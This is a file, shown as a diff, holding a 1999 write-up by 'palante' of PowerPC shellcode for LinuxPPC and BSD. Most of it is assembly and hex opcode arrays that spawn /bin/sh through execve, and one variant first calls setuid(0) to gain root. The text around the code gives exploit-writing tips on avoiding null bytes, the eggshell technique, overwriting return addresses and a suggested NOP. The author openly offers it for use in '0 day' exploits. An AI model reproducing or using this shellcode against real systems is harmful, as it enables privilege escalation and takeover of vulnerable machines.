@@ -1,0 +1,320 @@
+PPC shellcode
+Copyright 1999 palante <palante@subterrain.net>
+
+
+INTRODUCTION
+
+I realize that *nix on PPC is not terribly common. It was difficult to get
+access to a test platform. But PPC sales are taking off and more and more
+of their owners are joining the dark side to run *nix. Before you unleash
+yourself, ppc admins are probably new to this sort of thing. Please be nice
+to them. The enemy of your enemy is your friend.
+
+Both LinuxPPC and BSD (darwin?) versions are included. The only difference
+with the BSD version is that it uses system call 59 instead of 11 as execve.
+Sorry, no way to test it yet.
+		
+Lastly, if you use this in a 0 day sploit, I'm sure I can think of someone you
+would like to share it with. If you don't write exploits, you're probably
+wasting your time emailing me about this.
+
+
+See you at defcon or toorcon.
+
+
+SHELLCODE
+
+Making an execve call wasn't too hard, but it's very hard on the PPC to avoid
+all the null bytes in the opcodes. There are two very important opcodes which
+which can have nulls in them. The first is the sc opcode to make system calls.
+I've make the code self-modifying to get around that problem. Hopefully this
+won't cause trouble with the instruction cache. It works for me(TM) but YMMV.
+
+The other one is a bit more difficult. We need to give execve an absolute
+address to the string "/bin/sh", but since we don't have the help of the ld
+we don't have direct access to the absolute address. So there are two
+approaches. We could guess its offset relative to the stack pointer (R1)
+or frame pointer (R31). Or we could just do the equivalent of a function call
+(bl) to store the absolute address in the link register (spr8 and/or on the
+stack somewhere). I've chosen the second.
+
+And it's the branch relative instruction that is our second instruction with
+null bytes in it. This makes the code longer and even kludgier. The null byte
+will disappear if the size of the shellcode is tripled. This version will be
+included at the bottom. I've also included a setuid(0) call as part of that
+padding.
+
+Of course, it may be possible to work around the need to eliminate null bytes.
+If you use the eggshell technique, where you plant the shellcode onto the
+stack (ie the ENV) before execing the vulnerable program, and overflow the
+vulnerable program's stack only with the return address, you do not need an
+uninterupted string of shell opcodes. You can plant the eggshell, then zero
+out the remaining null byte (in the branch opcode on the stack in the ENV)
+and then exec away.
+
+Oh, if you're writing an exploit, you may arrive at the shellcode after a
+second return is called, and not just the return from the function you're in.
+The reason for this is that the return address that will be used next is
+technically stored on-chip in spr 8, although gcc copies it to and from the
+stack (at r1-0x4) but an optimized program will not necessarily do this. You
+may have to overwrite the stored value for the next return. 
+
+Suggested nop is 0x7ffffb78.
+
+	
+        .section ".text"      # Palante's LinuxPPC shellcode
+        .align 2
+        .globl m
+        .type    m,@function
+m:
+	xor  6,6,6            # r6 is 0
+	cmpi  7,0,6,0x7FFF    # do meaningless compare
+        bc 13,28,L2           # conditional branch to L2 - CAUSES NULL BYTE
+L1:     mfspr 3,8	      # address of /bin/sh into r3 (execve parameter)
+			
+	sth  6,-7(3)          # fix sc opcode
+	sth  6,-15(3)         # fix sc opcode
+	
+	addi 4,6,0x7FF0
+	addi 5,6,0x7FF4
+	addi 7,6,0x7FF3
+	xor  5,5,4            #got 0x4 into r5
+	xor  7,7,4            #got 0x3 into r7
+
+	
+	add  4,5,7            # r4 = 0x7
+	stbx 6,4,3            # store null after /bin/sh
+
+	add  0,4,5            # this makes 11 which is the execve system call
+        sub  7,5,7            # r7 = 0x1 for exit system call	
+
+        add  4,5,5            # r4 = 0x8
+        stwx 3,3,4            # and store pointer to /bin/sh at r3+0x8
+	add  4,3,4            # r4 = r3 + 0x8 (execve parameter)
+	stwx 6,5,4            # store NULL pointer
+        xor 5,5,5             # NULL (execve parameter)
+.long   0x44ffff02            # not quite an sc opcode
+	or 0,7,7              # syscall 1 - exit
+.long   0x44ffff02            # not quite an sc opcode
+
+L2:     bl L1                 # branch and link back to L1
+.long 0x2F62696E              #/bin/shZ
+.long 0x2F73685A
+.long 0xffffffff              # this is where pointer to /bin/sh goes
+.long 0xffffffff              # this is where null pointer goes
+
+.Lfe1:
+.size    m,.Lfe1-m
+
+
+long shellcode[] = { /* Palante's linuxPPC shellcode w/ NULL*/
+0x7CC63278, 0x2F867FFF, 0x41BC0054, 0x7C6802A6,
+0xB0C3FFF9, 0xB0C3FFF1, 0x38867FF0, 0x38A67FF4,
+0x38E67FF3, 0x7CA52278, 0x7CE72278, 0x7C853A14,
+0x7CC419AE, 0x7C042A14, 0x7CE72850, 0x7C852A14,
+0x7C63212E, 0x7C832214, 0x7CC5212E, 0x7CA52A78,
+0x44FFFF02, 0x7CE03B78, 0x44FFFF02, 0x4BFFFFB1,
+0x2F62696E, 0x2F73685A, 0xFFFFFFFF, 0xFFFFFFFF } ; 
+
+
+
+
+
+
+        .section ".text"      # Palante's BSD PPC shellcode
+        .align 2
+        .globl m
+        .type    m,@function
+m:
+	xor  6,6,6            # r6 is 0
+	cmpi  7,0,6,0x7FFF    # do meaningless compare
+        bc 13,28,L2           # conditional branch to L2 # CAUSES NULL BYTE
+L1:     mfspr 3,8	      # address of /bin/sh into r3 (execve parameter)
+			
+	sth  6,-7(3)          # fix sc opcode
+	sth  6,-15(3)         # fix sc opcode
+	
+	addi 4,6,0x7FF0
+	addi 5,6,0x7FF4
+	addi 7,6,0x7FF3
+	xor  5,5,4            #got 0x4 into r5
+	xor  7,7,4            #got 0x3 into r7
+
+	
+	add  4,5,7            # r4 = 0x7
+	stbx 6,4,3            # store null after /bin/sh
+
+	mullw 4,4,5           # r4 = 0x1c (28)
+        add  4,4,4            # r4 = 0x38 (56)
+	add  0,4,7            # this makes 59 which is the execve system call
+        
+        sub  7,5,7            # r7 = 0x1 for exit system call	
+
+        add  4,5,5            # r4 = 0x8
+        stwx 3,3,4            # and store pointer to /bin/sh at r3+0x8
+	add  4,3,4            # r4 = r3 + 0x8 (execve parameter)
+	stwx 6,5,4            # store NULL pointer
+        xor 5,5,5             # NULL (execve parameter)
+.long   0x44ffff02            # not quite an sc opcode
+	or 0,7,7              # syscall 1 - exit
+.long   0x44ffff02            # not quite an sc opcode
+
+L2:     bl L1                 # branch and link back to L1
+.long 0x2F62696E              #/bin/shZ
+.long 0x2F73685A
+.long 0xffffffff              # this is where pointer to /bin/sh goes
+.long 0xffffffff              # this is where null pointer goes
+
+.Lfe1:
+.size    m,.Lfe1-m
+
+
+long shellcode[] = { /* Palante's BSD PPC shellcode w/ NULL*/
+0x7CC63278, 0x2F867FFF, 0x41BC005C, 0x7C6802A6,
+0xB0C3FFF9, 0xB0C3FFF1, 0x38867FF0, 0x38A67FF4,
+0x38E67FF3, 0x7CA52278, 0x7CE72278, 0x7C853A14,
+0x7CC419AE, 0x7C8429D6, 0x7C842214, 0x7C043A14,
+0x7CE72850, 0x7C852A14, 0x7C63212E, 0x7C832214,
+0x7CC5212E, 0x7CA52A78, 0x44FFFF02, 0x7CE03B78,
+0x44FFFF02, 0x4BFFFFA9, 0x2F62696E, 0x2F73685A,
+0xFFFFFFFF, 0xFFFFFFFF }; 
+
+
+
+
+
+        .section ".text"      # Palante's LinuxPPC shellcode
+        .align 2
+        .globl m
+        .type    m,@function
+m:
+	xor  6,6,6            # r6 is 0
+	cmpi  7,0,6,0x7FFF    # do meaningless compare
+        bc 13,28,L2           # conditional branch to L2 - nops eliminate null
+L1:     mfspr 3,8	      # address of /bin/sh into r3 (execve parameter)
+			
+	sth  6,-75(3)         # fix sc opcode
+	sth  6,-83(3)         # fix sc opcode
+        sth  6,-123(3)        # fix sc opcode
+
+.long   0x7ffffb78            # padding. The instruction cache should only be
+.long   0x7ffffb78            # about 6 instructions, but just in case...
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+	
+	addi 4,6,0x7FF0
+	addi 5,6,0x7FF4
+	addi 7,6,0x7FF3
+	xor  5,5,4            #got 0x4 into r5
+	xor  7,7,4            #got 0x3 into r7
+
+	
+	add  4,5,7            # r4 = 0x7
+	stbx 6,4,3            # store null after /bin/sh
+
+	add  6,4,5            # this makes 11 which is the execve system call
+        sub  7,5,7            # r7 = 0x1 for exit system call	
+
+        add  4,5,5            # r4 = 0x8
+        add  5,4,4            # r5 = 0x10
+        add  5,4,5            # r5 = 0x18
+        sub  0,5,7            # this makes 23 which is the setuid call
+        or   5,3,3            # tuck ptr to /bin/sh away
+        xor  3,3,3            # I wanna be rewt (setuid parameter)
+.long   0x44ffff02            # not quite an sc opcode (for setuid)
+        or   3,5,5            # ptr to /bin/sh back to r3 (execve parameter)
+        or   0,6,6            # execve system call number
+        xor  6,6,6
+        add  5,7,7
+        add  5,5,5            # get r5 back to 0x4
+
+        stwx 3,3,4            # and store pointer to /bin/sh at r3+0x8
+	add  4,3,4            # r4 = r3 + 0x8 (execve parameter)
+	stwx 6,5,4            # store NULL pointer
+
+        xor 5,5,5             # NULL (execve parameter)
+
+.long   0x44ffff02            # not quite an sc opcode (for execve)
+	or 0,7,7              # syscall 1 - exit
+.long   0x44ffff02            # not quite an sc opcode (for exit)
+
+
+.long   0x7ffffb78            # bunch 'o nops. This eliminates the null
+.long   0x7ffffb78            # byte caused by the branch
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+.long   0x7ffffb78
+
+L2:     xor 6,6,6             # zero out again so we can also land in the NOPS
+        bl L1                 # branch and link back to L1
+.long 0x2F62696E              #/bin/shZ
+.long 0x2F73685A
+
+.long 0xffffffff              # this is where pointer to /bin/sh goes
+.long 0xffffffff              # this is where null pointer goes
+
+.Lfe1:
+.size    m,.Lfe1-m
+
+
+
+long shellcode[] = { /* Palante's linuxPPC shellcode */
+0x7cc63278, 0x2f867fff, 0x41bc0104, 0x7c6802a6, 0xb0c3ffb5, 0xb0c3ffad,
+0xb0c3ff85, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78,
+0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78,
+0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x38867ff0,
+0x38a67ff4, 0x38e67ff3, 0x7ca52278, 0x7ce72278, 0x7c853a14, 0x7cc419ae,
+0x7cc42a14, 0x7ce72850, 0x7c852a14, 0x7ca42214, 0x7ca42a14, 0x7c072850,
+0x7c651b78, 0x7c631a78, 0x44ffff02, 0x7ca32b78, 0x7cc03378, 0x7cc63278,
+0x7ca73a14, 0x7ca52a14, 0x7c63212e, 0x7c832214, 0x7cc5212e, 0x7ca52a78,
+0x44ffff02, 0x7ce03b78, 0x44ffff02, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78,
+0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78,
+0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78,
+0x7ffffb78, 0x7cc63278, 0x4bfffefd, 0x2f62696e, 0x2f73685a, 0xffffffff,
+0xffffffff };
+
+
+long shellcode[] = { /* Palante's BSD PPC shellcode */
+0x7cc63278, 0x2f867fff, 0x41bc0104, 0x7c6802a6, 0xb0c3ffbd, 0xb0c3ffb5,
+0xb0c3ff8d, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78,
+0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78,
+0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x38867ff0,
+0x38a67ff4, 0x38e67ff3, 0x7ca52278, 0x7ce72278, 0x7c853a14, 0x7cc419ae,
+0x7c8429d6, 0x7c842214, 0x7cc43a14, 0x7ce72850, 0x7c852a14, 0x7ca42214,
+0x7ca42a14, 0x7c072850, 0x7c651b78, 0x7c631a78, 0x44ffff02, 0x7ca32b78,
+0x7cc03378, 0x7cc63278, 0x7ca73a14, 0x7ca52a14, 0x7c63212e, 0x7c832214,
+0x7cc5212e, 0x7ca52a78, 0x44ffff02, 0x7ce03b78, 0x44ffff02, 0x7ffffb78,
+0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78,
+0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78, 0x7ffffb78,
+0x7ffffb78, 0x7cc63278, 0x4bfffefd, 0x2f62696e, 0x2f73685a, 0xffffffff,
+0xffffffff };
+
+
+
+test program:
+void main() { __asm__("b shellcode"); }
+
+
